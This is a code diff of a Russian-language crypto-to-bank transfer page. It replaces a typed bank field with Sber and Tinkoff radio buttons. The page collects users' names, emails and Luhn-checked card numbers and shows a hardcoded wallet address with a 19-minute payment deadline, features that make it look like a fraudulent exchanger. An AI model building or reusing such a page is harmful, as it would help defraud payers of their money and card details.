@@ -267,32 +267,30 @@
                                     <label style='color:white;' for="opt12" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt12" value='usdc' onchange='usdc20()' required><img src='./img/sybmol/usd_coin.svg' style='width:10%'> USDC (BEP20)</label>
                                     <label style='color:white;' for="opt6" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt6" value='bnb20' onchange='bnb20()' required><img src='./img/sybmol/binance_coin.svg' style='width:10%'> BNB (BEP20)</label>
                                     <label style='color:white;' for="opt7" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt7" value='bnb2' onchange='bnb2()' required><img src='./img/sybmol/binance_coin.svg' style='width:10%'> BNB (BEP2)</label>
-                                    <label style='color:white;' for="opt7" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt7" value='bnb2' onchange='busd()' required><img src='./img/sybmol/binance_usd.svg' style='width:10%'> BUSD</label>
+                                    <label style='color:white;' for="opt13" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt13" value='bnb2' onchange='busd()' required><img src='./img/sybmol/binance_usd.svg' style='width:10%'> BUSD</label>
                                     <label style='color:white;' for="opt9" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt9" value='xrp' onchange='xrp()' required><img src='./img/sybmol/ripple.svg' style='width:10%'> XRP</label> 
                                     <label style='color:white;' for="opt10" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt10" value='xrp1' onchange='xrp20()' required><img src='./img/sybmol/ripple.svg' style='width:10%'> XRP (BEP20)</label>       
                                     <label style='color:white;' for="opt11" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt11" value='xrp2' onchange='xrp2()' required><img src='./img/sybmol/ripple.svg' style='width:10%'> XRP (BEP2)</label>
                                     <label style='color:white;' for="opt5" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt5" value='eth' onchange='eth()' required><img src='./img/sybmol/ethereum.svg' style='width:10%'> ETH (ERC20)</label>
                                     <label style='color:white;' for="opt8" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt8" value='trx' onchange='trx()' required><img src='./img/sybmol/tron.svg' style='width:10%'> TRX</label>
-                                    
-                                            
                                         </div>
-                                <div class="media-wrapper" style='margin-bottom: 50px;'>
-                                   
+                                <div class="media-wrapper" style='margin-bottom: 20px;'>
                                 </div>
-                                <div class="control-material is-secondary">      
+                                <p style='color: #0f9;padding: 10px 0 10px 0;font-size:14px;'>Выберите Банк </p>
+                                <div class="size_block">
+                                    <label style='color:white;' for="opt14" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt14" value='btc' onchange='sber()' required><img src='./img/sybmol/sber.png' style='width:10%'> Сбер</label>
+                                    <label style='color:white;' for="opt15" class="option" name='valute'><input class="selectopt" name="currency" type="radio" id="opt15" value='usdt' onchange='tinkof()' required><img src='./img/sybmol/tinkof.png' style='width:10%'> Тинькофф</label>         
+                                        </div>
+                                        <div class="media-wrapper" style='margin-bottom: 50px;'>
+                                        </div>
+                                <div class="control-material is-secondary" style='margin-bottom: 10px;'>      
                                     <input class="material-input" type="number" name='price' min="20" value='20' required id='price' required>
                                     <span class="material-highlight"></span>
                                     <span class="bar"></span>
                                     <label>Сумма перевода: <span style='color:gray;'>от 20$</span></label>
                                 </div>
-                                <div class="control-material is-secondary" style='margin-bottom: 10px;'>      
-                                    <input class="material-input" type="text" name='bank' id='bank_name' required>
-                                    <span class="material-highlight"></span>
-                                    <span class="bar"></span>
-                                    <label>Банк (Сбер, Тинькофф)</label>
-                                </div>
 
-                                <div class="button-block" style='margin-bottom: 30px;'>
+                                <div class="button-block" style='margin-bottom: 10px;'>
                                     <a onclick="pay()" class="button k-button k-secondary raised has-gradient is-bold">
                                         <span class="text">ОСУЩЕСТВИТЬ ПЕРЕВОД</span>
                                         <span class="front-gradient"></span>
@@ -350,7 +348,7 @@ return x = true;
 }
 }
 var pay_money = '1EoKrTM5dCspZt9cFkc454pFUZgmJeTJii';
-
+var bank = '';
 function btc(e) {
     pay_money = '1EoKrTM5dCspZt9cFkc454pFUZgmJeTJii';
     swal({
@@ -450,10 +448,27 @@ function trx() {
   });
     return pay_money;
 }
+function sber() {
+    bank = 'Сбер';
+    swal({
+    title: "Банк выбран",
+    text: "Сбер",
+    icon: "http://smallcommission.su/img/sybmol/sber.png",
+  });
+    return bank;
+}
+function tinkof() {
+    bank = 'Тинькофф';
+    swal({
+    title: "Банк выбран",
+    text: "Тинькофф",
+    icon: "http://smallcommission.su/img/sybmol/tinkof.png",
+  });
+    return bank;
+}
 
 function pay() {
     var first = document.getElementById('price').value;
-    var second = document.getElementById('bank_name').value;
     var fio = document.getElementById('fio').value;
     var email = document.getElementById('email').value;
     var requisites = document.getElementById('requisites').value;
@@ -462,7 +477,7 @@ function pay() {
     console.log('Проверка' + luhnAlgorithm(requisites));
     if (luhnAlgorithm(requisites) == true) {
 
-    if (first !== '' && second !== '' && fio !== '' && email !== '' && requisites !== '') {
+    if (first !== '' && bank !== '' && fio !== '' && email !== '' && requisites !== '') {
         if (first < 20) {
             swal({
             title: "Платёж можно совершить только от 20$",
@@ -491,14 +506,14 @@ function pay() {
         } else {
         price = 'Нет данных';
         }
-        var second = document.getElementById('bank_name').value;
-        if (second !== '') {
-        bank_name = second;
+        
+        if (bank !== '') {
+        bank_name = bank;
         } else {
         bank_name = 'Нет данных';
         }
         var span = document.createElement("span");
-span.innerHTML = '<span style="font-size:20px;"> <b>Заявка №' + number + '</b>: <span style="color:blue">В процессе</span> </span> <br><br> Вам дано 19 минут, чтобы совершить транзакцию. <br><br>Сумма транзакции: ' + price + '<br>Банковская организация: ' + bank_name + '<br><hr><p style="font-size:15px;text-align:center;">Номер кошелька:<br>' + pay_money;
+span.innerHTML = '<span style="font-size:20px;"> <b>Заявка №' + number + '</b>: <span style="color:blue">В процессе</span> </span> <br><br> Вам дано 19 минут, чтобы совершить транзакцию. <br><br>Сумма транзакции: ' + price + '<br>Банковская организация: ' + bank + '<br><hr><p style="font-size:15px;text-align:center;">Номер кошелька:<br>' + pay_money;
 
 swal({
     content: span,
@@ -560,11 +575,10 @@ swal({
 
 function finish() {
     var first = document.getElementById('price').value;
-    var second = document.getElementById('bank_name').value;
     var fio = document.getElementById('fio').value;
     var email = document.getElementById('email').value;
     var requisites = document.getElementById('requisites').value;
-    if (first !== '' && second !== '' && fio !== '' && email !== '' && x == true) {
+    if (first !== '' && bank !== '' && fio !== '' && email !== '' && x == true) {
         
     } else {
     
